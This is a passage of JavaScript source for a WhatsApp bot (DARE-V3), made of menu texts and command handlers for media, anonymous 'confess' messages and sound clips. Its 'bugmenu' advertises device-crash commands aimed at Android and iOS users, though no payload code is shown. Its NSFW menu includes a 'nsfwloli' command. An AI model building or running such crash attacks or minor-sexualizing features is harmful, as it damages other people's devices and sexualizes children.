> 🏞️ *${prefix}WALLML*
> 📱 *${prefix}WALLPHONE*
> 🏔️ *${prefix}MOUNTAIN*
> 🖼️ *${prefix}PROFILEPIC*
> 👩‍❤️‍👨 *${prefix}COUPLEPIC*
> 💻 *${prefix}PROGRAMMING*
> 🎮 *${prefix}PUBG*
> 🎤 *${prefix}BLACKPINK*
┗━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'animemenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `
『 *\`𝐀𝐍𝐈𝐌𝐄\`* 』${readmore}
> 👘 *${prefix}AKIRA*
> 🕴️ *${prefix}AKIYAMA*
> 🍎 *${prefix}ANA*
> 🗡️ *${prefix}ASUNA*
> 👧 *${prefix}AYUZAWA*
> 🍥 *${prefix}BORUTO*
> 🦊 *${prefix}CHIHO*
> 💛 *${prefix}CHITOGE*
> 👗 *${prefix}COSPLAYLOLI*
> 🎀 *${prefix}COSPLAYSAGIRI*
> 🐉 *${prefix}DEIDARA*
> 🤖 *${prefix}DORAEMON*
> 🧑‍🦳 *${prefix}ELAINA*
> 🌸 *${prefix}EMILIA*
> 🛡️ *${prefix}ERZA*
> 🔥 *${prefix}GREMORY*
> 🏛️ *${prefix}HESTIA*
> 🌼 *${prefix}HINATA*
> 💪 *${prefix}HUSBU*
> 🕊️ *${prefix}INORI*
> 🚗 *${prefix}ISUZU*
> 🍃 *${prefix}ITACHI*
> 👹 *${prefix}ITORI*
> ⚡ *${prefix}KAGA*
> 🎻 *${prefix}KAGURA*
> 🔥 *${prefix}KAKASIH*
> 🎵 *${prefix}KAORI*
> 🐺 *${prefix}KENEKI*
> 🦜 *${prefix}KOTORI*
> 🕷️ *${prefix}KURUMI*
> 🦦 *${prefix}LOLI*
> 💀 *${prefix}MADARA*
> 💥 *${prefix}MEGUMIN*
> 🗡️ *${prefix}MIKASA*
> 🦅 *${prefix}MIKEY*
> 🎶 *${prefix}MIKU*
> 💨 *${prefix}MINATO*
> 🍥 *${prefix}NARUTO*
> 🐱 *${prefix}NEKO*
> 🐾 *${prefix}NEKO2*
> 🐈 *${prefix}NEKONIME*
> 🔥 *${prefix}NEZUKO*
> ⚓ *${prefix}ONEPIECE*
> 🐉 *${prefix}POKEMON*
> 🎮 *${prefix}RANDOMNIME*
> 🌀 *${prefix}RANDOMNIME2*
> 🍃 *${prefix}RIZE*
> 🍥 *${prefix}SAGIRI*
> 🌸 *${prefix}SAKURA*
> ⚔️ *${prefix}SASUKE*
> 🌞 *${prefix}SHINA*
> 💀 *${prefix}SHINKA*
> 🌸 *${prefix}SHINOMIYA*
> 🧸 *${prefix}SHIZUKA*
> 🐯 *${prefix}SHOTA*
> 🎶 *${prefix}TEJINA*
> 🧸 *${prefix}TOUKACHAN*
> 💕 *${prefix}TSUNADE*
> 💘 *${prefix}WAIFU*
> 🌄 *${prefix}ANIMEWALL*
> 🍵 *${prefix}YOTSUBA*
> 🌹 *${prefix}YUKI*
> 💫 *${prefix}YULIBOCIL*
> 🏫 *${prefix}YUMEKO*
> 🔮 *${prefix}8BALL*
> 😆 *${prefix}TICKLE*
> 🎮 *${prefix}GECG*
> 🍽️ *${prefix}FEED*
> 🐾 *${prefix}ANIMEAWOO*
> 🎶 *${prefix}ANIMEMEGUMIN*
> 😻 *${prefix}ANIMESHINOBU*
> 🖐️ *${prefix}ANIMEHANDHOLD*
> ✋ *${prefix}ANIMEHIGHFIVE*
> 🥴 *${prefix}ANIMECRINGE*
> 💃 *${prefix}ANIMEDANCE*
> 😊 *${prefix}ANIMEHAPPY*
> 🤗 *${prefix}ANIMEGLOMP*
> 😊 *${prefix}ANIMEBLUSH*
> 😏 *${prefix}ANIMESMUG*
> 👋 *${prefix}ANIMEWAVE*
> 😄 *${prefix}ANIMESMILE*
> 👀 *${prefix}ANIMEPOKE*
> 😉 *${prefix}ANIMEWINK*
> 👊 *${prefix}ANIMEBONK*
> 😡 *${prefix}ANIMEBULLY*
> 🎯 *${prefix}ANIMEYEET*
> 🦷 *${prefix}ANIMEBITE*
> 👅 *${prefix}ANIMELICK*
> 💀 *${prefix}ANIMEKILL*
> 😢 *${prefix}ANIMECRY*
> 📷 *${prefix}ANIMEWLP*
> 💋 *${prefix}ANIMEKISS*
> 🤗 *${prefix}ANIMEHUG*
> 🐱 *${prefix}ANIMENEKO*
> 🐾 *${prefix}ANIMEPAT*
> 💥 *${prefix}ANIMESLAP*
> 🤗 *${prefix}ANIMECUDDLE*
> 💘 *${prefix}ANIMEWAIFU*
> 🦄 *${prefix}ANIMENOM*
> 🦊 *${prefix}ANIMEFOXGIRL*
> 🧑‍🎤 *${prefix}ANIMEGECG*
> 🐾 *${prefix}ANIMETICKLE*
> 🍽️ *${prefix}ANIMEFEED*
> 🖼️ *${prefix}ANIMEAVATAR*
> 🗡️ *${prefix}GENSHIN*
> 🎥 *${prefix}ANIME*
> 🎶 *${prefix}AMV*
╰━━━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'nsfwmenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `『 *\`𝐍𝐒𝐅𝐖 𝐌𝐄𝐍𝐔\`* 』${readmore}
> *${prefix}paptt*
> *${prefix}hentaivid*
> *${prefix}hentaivid2*
> *${prefix}hneko*
> *${prefix}nwaifu*
> *${prefix}animespank*
> *${prefix}trap*
> *${prefix}gasm*
> *${prefix}ahegao*
> *${prefix}ass*
> *${prefix}bdsm*
> *${prefix}blowjob*
> *${prefix}cuckold*
> *${prefix}cum*
> *${prefix}milf*
> *${prefix}eba*
> *${prefix}ero*
> *${prefix}femdom*
> *${prefix}foot*
> *${prefix}gangbang* 
> *${prefix}glasses*
> *${prefix}jahy*
> *${prefix}masturbation*
> *${prefix}manga*
> *${prefix}neko-hentai*
> *${prefix}neko-hentai2*
> *${prefix}nsfwloli*
> *${prefix}orgy*
> *${prefix}panties*
> *${prefix}pussy*
> *${prefix}tentacles*
> *${prefix}thighs*
> *${prefix}yuri*
> *${prefix}zettai*
> *${prefix}xnxxsearch*
┗━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'bugmenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `
『 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 』${readmore}
> 💀 ${prefix}DANSYAVIP
> 💥 ${prefix}DANSYACRUSH
> 📱 ${prefix}XANDROID
> 📱 ${prefix}XANDROID2
> 💻 ${prefix}SYSTEMUICRASH
> 🔧 ${prefix}XSYSUI
> 📲 ${prefix}XIOS
> 📲 ${prefix}XIOS2
> 💾 ${prefix}XGC
> 🛠 ${prefix}IOSKILL
> 💻 ${prefix}IOSX
> 💥 ${prefix}ONEKILL
> 💣 ${prefix}ONECLICKALL
> 📱 ${prefix}XSAMSUNG
> 🌐 ${prefix}XWAWEB
> 💀 ${prefix}DOUBLEKILL
> 💥 ${prefix}TRIPLEKILL
┗━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'othermenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await loading()
let menya = `『 𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔』${readmore}
> 📡 ${prefix}PING
> 🎬 ${prefix}VV/SHOW
> 🎬 ${prefix}VV2/WOW
> 📸 ${prefix}PAPTT
> 💻 ${prefix}TOTALCMD
> 📜 ${prefix}MENU
> 🐞 ${prefix}REPORTBUG
> 📋 ${prefix}LISTPEM
> 📋 ${prefix}LISTPC
> 📋 ${prefix}LISTGC
> 👑 ${prefix}OWNER
> 💸 ${prefix}DONATE
> 🔒 ${prefix}OBFUSCATE
> 🎨 ${prefix}STYLE
> 🗣 ${prefix}SAY
> 🎥 ${prefix}TOGIF
> 🔳 ${prefix}TOQR
> 🎶 ${prefix}BASS
> 💨 ${prefix}BLOWN
> 🎤 ${prefix}DEEP
> 🎧 ${prefix}EARRAPE
> ⚡ ${prefix}FAST
> 🍔 ${prefix}FAT
> 🌙 ${prefix}NIGHTCORE
> 🔄 ${prefix}REVERSE
> 🤖 ${prefix}ROBOT
> ⏳ ${prefix}SLOW
> 🧴 ${prefix}SMOOTH
> 🐿 ${prefix}SQUIRREL
> 🔗 ${prefix}TINYURL
> 🎶 ${prefix}TOVN
> 🎧 ${prefix}TOAUDIO
> 🎥 ${prefix}TOMP3
> 🎥 ${prefix}TOMP4
> 🖼 ${prefix}TOIMG
> 🎥 ${prefix}TOVV
> 🖼 ${prefix}STICKER
> 🔎 ${prefix}TAKE
> ⏱ ${prefix}RUNTIME
┗━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break

case 'menu': {
await loading()
  const menya = `┌─ 📊 *𝐃𝐀𝐑𝐄-𝐕𝟑* ─┐
├─ ❖ *Name*: ${pushname}
├─ ❖ *Status User*: ${isPrem ? 'premium' : 'free user'}
├─ ❖ *Mode*: _${Dare.public ? 'Public' : 'Self'}_
├─ ❖ *User*: ${Object.keys(global.db.users).length}${readmore}
├─ 🤖 *BOT INFO 😌* ───┐
├─ ❖ *Name Bot*: ${botname}
├─ ❖ *Total Cmds*: ${nanototalpitur()}
├─ ❖ *Runtime*: ${runtime(process.uptime())}
├─ ❖ *Developer*: ${ownername}
└─ ❖ *Version*: 3${readmore}
╭─┴─❍「 *TIME* 」❍
├ *Date* : ${xdate}
├ *BUY SCRIPT*
├ ${pushname}
╰─┬────❍
> ├ *Prefix* :「 」${readmore}
  └─  *${botname}* 𝐌𝐄𝐍𝐔 🌹
> *𝙏𝙮𝙥𝙚 𝙍𝙐𝙇𝙀𝙎 𝙩𝙤 𝙫𝙞𝙚𝙬 𝙧𝙪𝙡𝙚𝙨*
> ❏ *DAREINFO*
> ❏ *AIMENU*
> ❏ *GAMEMENU*
> ❏ *OWNERMENU*
> ❏ *BUGMENU*
> ❏ *OWNERMENU2*
> ❏ *FUNMENU*
> ❏ *OWNERMENU*
> ❏ *NSFWMENU*
> ❏ *PUSHMENU*
> ❏ *EPHOTO360MENU*
> ❏ *RANDOMPHOTOMENU*
> ❏ *GCMENU*
> ❏ *ANIMEMENU*
> ❏ *CPANNELMENU*
> ❏ *GCMENU2*
> ❏ *RPGMENU*
> ❏ *DOMAINMENU*
> ❏ *STALKERMENU*
> ❏ *CREDIT*
> ❏ *OTHERMENU*
> ❏ *OTHERMENU2*
> ❏ *ALIVE/AREACT*
> ❏ *BANKAI/NARUTOPAIN
╚══════════════════
`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://files.catbox.moe/308rud.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break

case 'dareinfo': {
await loading()
  const xmenu_oh = `
HEY *${pushname}!* 🌹
𝙸 𝙰𝙼 *${botname}* 𝙱𝙾𝚃 𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 𝙱.𝙼.𝙱 𝚇 𝙳𝙰𝚁𝙴, 
𝙳𝙰𝚁𝙴-𝚅3 𝚆𝙰𝚂 𝙸𝚂𝙿𝙸𝚁𝙴𝙳 𝙱𝚈 𝙿𝙰𝚃𝚁𝙾𝙽-𝙼𝙳 𝙱𝙰𝚂𝙴 𝙵𝚁𝙾𝙼 𝙽𝙰𝙽𝙾 𝙱𝙾𝚃𝚉.
𝙳𝙰𝚁𝙴 𝙸𝚂 𝙰 𝙱𝙾𝚃 𝙾𝙵 𝙼𝙰𝙽𝚈 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂,𝙼𝙰𝙳𝙴 𝚃𝙾 𝚂𝙰𝚃𝙸𝚂𝙵𝚈 𝚄𝚂𝙴𝚁, 
𝙱𝙴𝙸𝙽𝙶 𝚄𝙿𝙶𝚁𝙰𝙳𝙴𝙳 𝙳𝙰𝙸𝙻𝚈 𝚃𝙾 𝙱𝙴 𝙰𝚃 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝚃𝙰𝚃𝙴.
𝙷𝙰𝙿𝙿𝙸𝙽𝙴𝚂𝚂 𝙼𝙰𝙳𝙴 𝙱.𝙼.𝙱 𝚆𝙷𝙾 𝙷𝙴 𝙸𝚂 𝚃𝙾𝙳𝙰𝚈, 
𝙼𝙰𝙸𝚃𝙴 𝚂𝙷𝙰𝙿𝙴𝙳 𝙳𝙰𝚁𝙴. 
𝙳𝙰𝚁𝙴-𝚅3 𝚂𝙲𝚁𝙸𝙿𝚃 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝙶𝙸𝚅𝙴𝙽 𝚃𝙾 𝚂𝙾𝙼𝙴 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁𝚂 𝚃𝙾 𝚄𝚂𝙴 
𝙰𝚂 𝙱𝙰𝚂𝙴 𝚆𝙷𝙸𝙻𝙴 𝙿𝚁𝙾𝙼𝙸𝚂𝙸𝙽𝙶 𝚃𝙾 𝙶𝙸𝚅𝙴 𝙲𝚁𝙴𝙳𝙸𝚃.
𝚃𝙾 𝚂𝙴𝙴 𝙼𝚈 𝙵𝙴𝙰𝚃𝚄𝚁𝙴 𝚃𝚈𝙿𝙴 𝙼𝙴𝙽𝚄
𝚃𝙾 𝚂𝙴𝙴 𝙼𝚈 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𝙸𝙽𝙵𝙾 𝚃𝚈𝙿𝙴 𝙳𝙴𝚅𝙸𝙽𝙵𝙾
𝚃𝙷𝙰𝙽𝙺𝚂 𝚃𝙾 𝙴𝚅𝙴𝚁𝚈𝙾𝙽𝙴 𝚃𝙷𝙰𝚃 𝙲𝙰𝙾𝙽𝚃𝚁𝙸𝙱𝚄𝚃𝙴𝙳 𝚃𝙾 𝙳𝙰𝚁𝙴-𝚅3
`;

  try {
    await Dare.sendMessage(m.chat, {
      image: { url: 'https://files.catbox.moe/8gy9ip.jpg' },
      caption: xmenu_oh,
      footer: 'BMB',
      buttons: [
        { buttonId: '.darev3', buttonText: { displayText: '𝐃𝐀𝐑𝐄' } },
        { buttonId: '.alive', buttonText: { displayText: '𝐀𝐋𝐈𝐕𝐄' } },
      ],
      viewOnce: true,
    }, { quoted: m });

    const darkphonk = 'https://files.catbox.moe/9oda0g.mp3';
    await Dare.sendMessage(m.chat, {
      audio: { url: darkphonk },
      mimetype: 'audio/mpeg',
      ptt: true,
    }, { quoted: m });
  } catch (error) {
    console.error('Error sending message:', error);
  }
}
break;

case 'devinfo': {
await loading()
  const xmenu_oh = `
✨ Welcome to My DevInfo Realm! ✨

👩‍💻 Who Am I?
Hey there! I’m BMB, a passionate digital architect who loves to build, design, and innovate. From crafting sleek interfaces to optimizing backend magic, I’m all about creating tech wonders that leave a mark.
${readmore}
🛠️ My Toolbox of Talents:

Languages I Speak: Python 🐍, JavaScript ⚡, C++ 💡

Design Magicianry: UI/UX Wizard 🎨, Figma Ninja ✍️

Tech Arsenal: Git 🔗, Docker 🐳, Jenkins ⚙️
${readmore}
📜 The Journey So Far:
🚀 Software Engineer at DARE-CORP – Tackling challenges, one line of code at a time!
🌍 Open Source Adventurer – Giving back to the community with every pull request.
🎯 Freelancer Extraordinaire – Designing and developing masterpieces for happy clients.
${readmore}
📚 Leveling Up My Powers:
🎓 Graduated with a degree in [Field of Study] from the prestigious [University Name] – where my coding dreams took flight!
${readmore}
🌱 What Fuels My Fire:

AI Enthusiast 🤖 – Exploring the realms of machine learning.

Gamer at Heart 🎮 – Conquering virtual worlds in my downtime.

Coffee Lover ☕ – Code runs smoother with caffeine!

Music Addict 🎵 – A melody for every mood.
${readmore}
📫 Where to Find Me:

📧 Email: [dareshallruleoverall@gmail.coml]

🔗 Portfolio: [https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M]

🐦 Tiktok: [https://www.tiktok.com/@bmb_is_a_bot?_t=ZM-8tQ00qjTZnp&_r=1]

👔 LinkedIn: [https://wa.me/2348089405509]


🌟 Let’s collaborate and create magic! 🌟
`;

  try {
    await Dare.sendMessage(m.chat, {
      image: { url: 'https://files.catbox.moe/6a2we2.jpg' },
      caption: xmenu_oh,
      footer: 'BMB',
      buttons: [
        { buttonId: '.repo', buttonText: { displayText: '𝗥𝗘𝗣𝗢' } },
        { buttonId: '.menu', buttonText: { displayText: '𝗠𝗘𝗡𝗨' } },
      ],
      viewOnce: true,
    }, { quoted: m });

    const darkphonk = 'https://files.catbox.moe/2gd6ap.mp3';
    await Dare.sendMessage(m.chat, {
      audio: { url: darkphonk },
      mimetype: 'audio/mpeg',
      ptt: true,
    }, { quoted: m });
  } catch (error) {
    console.error('Error sending message:', error);
  }
}
break;

                 //alive
case 'alive': {
    const audioUrl = 'https://files.catbox.moe/odfry7.mp3'; // Replace with the actual URL
    const dooc = {
        audio: {
            url: audioUrl
        },
        mimetype: 'audio/mp4',
        ptt: true,
        waveform: [100, 0, 100, 0, 100, 0, 100],
        fileName: "",

        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                title: "DARE-V3 SPEECH☠️",
                body: "MADARA'S SPEECH 💬",
                thumbnailUrl: "https://files.catbox.moe/ppchzp.jpg",
                sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    };

    await Dare.sendMessage(m.chat, dooc, { quoted: m });
    break;
}

case 'confess': case 'confes': case 'menfes': case 'menfess':{
Dare.menfes = Dare.menfes ? Dare.menfes : {}
roof = Object.values(Dare.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return reply("Kamu masih berada dalam sesi menfess")
if (m.isGroup) return reply('Fitur Khusus Di private chat!')
if (!text) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if (!text.includes('|')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6292818802718|Menfes nih\n`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
var yoi = `Hi ada menfess nih buat kamu\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan ketik ${prefix}balasmenfess -- Untuk menerima menfess/confess\nSilahkan ketik ${prefix}tolakmenfess -- Untuk menolak menfess/confess\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
let tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg') 
let id = m.sender
Dare.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 await Dare.sendMessage(nomorNya + '@s.whatsapp.net', {image: tod, caption:yoi }, {})
reply('Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy')
}
break
case 'balasmenfess': case 'balasmenfes': {
let roof = Object.values(Dare.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
if (!roof) return reply("Belum ada sesi menfess");
let room = Object.values(Dare.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
if (!room) return reply("Tidak ada sesi menfess yang sedang menunggu");
let other = [room.a, room.b].find(user => user !== m.sender);
room.b = m.sender;
room.state = 'CHATTING';
Dare.menfes[room.id] = {...room};
await Dare.sendMessage(other, { 
  text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`, 
  mentions: [m.sender]
});
Dare.sendMessage(m.chat, { 
  text: `_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`
});
}
break
 case 'tolakmenfess': case 'tolakmenfes': {
roof = Object.values(Dare.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return reply("Belum ada sesi menfess")
let room = Object.values(Dare.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(Dare.menfes).find(menpes => menpes.state == 'WAITING')
Dare.sendMessage(other, {text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`, mentions: [m.sender]})
// await Dare.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
reply("Menfess berhasil di tolak 🤚")
delete Dare.menfes[roof.id]
}
break
 case 'stopconfess': case 'stopmenfess': {
 //find = Object.values(Dare.menfes).find(menpes => menpes.state == 'WAITING')
find = Object.values(Dare.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return reply("Belum ada sesi menfess")
const to = find.a == m.sender ? find.b : find.a
Dare.sendMessage(to, {text: `_Teman chat telah menghentikan menfess ini_`, mentions:[m.sender]})
await reply("ok")
delete Dare.menfes[find.id]
}
 break

case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
case 'mangkane1':
case 'mangkane2':
case 'mangkane3':
case 'mangkane4':
case 'mangkane5':
case 'mangkane6':
case 'mangkane7':
case 'mangkane8':
case 'mangkane9':
case 'mangkane10':
case 'mangkane11':
case 'mangkane12':
case 'mangkane13':
case 'mangkane14':
case 'mangkane15':
case 'mangkane16':
case 'mangkane17':
case 'mangkane18':
case 'mangkane19':
case 'mangkane20':
case 'mangkane21':
case 'mangkane22':
case 'mangkane23':
case 'mangkane24':
case 'mangkane25':
case 'mangkane26':
case 'mangkane27':
case 'mangkane28':
case 'mangkane29':
case 'mangkane30':
case 'mangkane31':
case 'mangkane32':
case 'mangkane33':
case 'mangkane34':
case 'mangkane35':
case 'mangkane36':
case 'mangkane37':
case 'mangkane38':
case 'mangkane39':
case 'mangkane40':
case 'mangkane41':
case 'mangkane42':
case 'mangkane43':
case 'mangkane44':
case 'mangkane45':
case 'mangkane46':
case 'mangkane47':
case 'mangkane48':
case 'mangkane49':
case 'mangkane50':
case 'mangkane51':
case 'mangkane52':
case 'mangkane53':
case 'mangkane54':
case 'acumalaka':
case 'reza-kecap':
case 'farhan-kebab':
case 'omaga':
case 'kamu-nanya':
case 'anjay':
case 'siuu':
viot = 'https://files.catbox.moe/7rt6v2.jpg'
thumb = 'https://files.catbox.moe/7rt6v2.jpg'
let sound
if (/sound/.test(command)) sound = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') < 25) sound = `https://raw.githubusercontent.com/hyuura/Rest-Sound/main/HyuuraKane/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') > 24) sound = `https://raw.githubusercontent.com/aisyah-rest/mangkane/main/Mangkanenya/${command}.mp3`
if (/acumalaka|reza-kecap|farhan-kebab|omaga|omaga|kamu-nanya|anjay|siuu/.test(command)) sound = `https://github.com/FahriAdison/Base-Sound/raw/main/audio/${command}.mp3`
if (text.toLowerCase() === 'thumb') {
await Dare.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: true, 
contextInfo: {
externalAdReply: {
mediaUrl: 'https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M', 
mediaType: 2, 
title: '  ⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻  ', 
body: '  ━━━━⬤──────────  ', 
description: 'Now Playing...',
mediaType: 2, 
sourceUrl: 'https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M',
thumbnail: await (await fetch(viot)).buffer(), 
renderLargerThumbnail: true}}}, {quoted: m})
} else await Dare.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: true}, {quoted: m})
break
case 'friend':
case 'searchfriend':{
reply(mess.wait)
let teman = pickRandom(dansyaverifikasiuser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replydare('Managed to Get One Person')
}, 5000)
setTimeout(() => {
Dare.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'rules': {
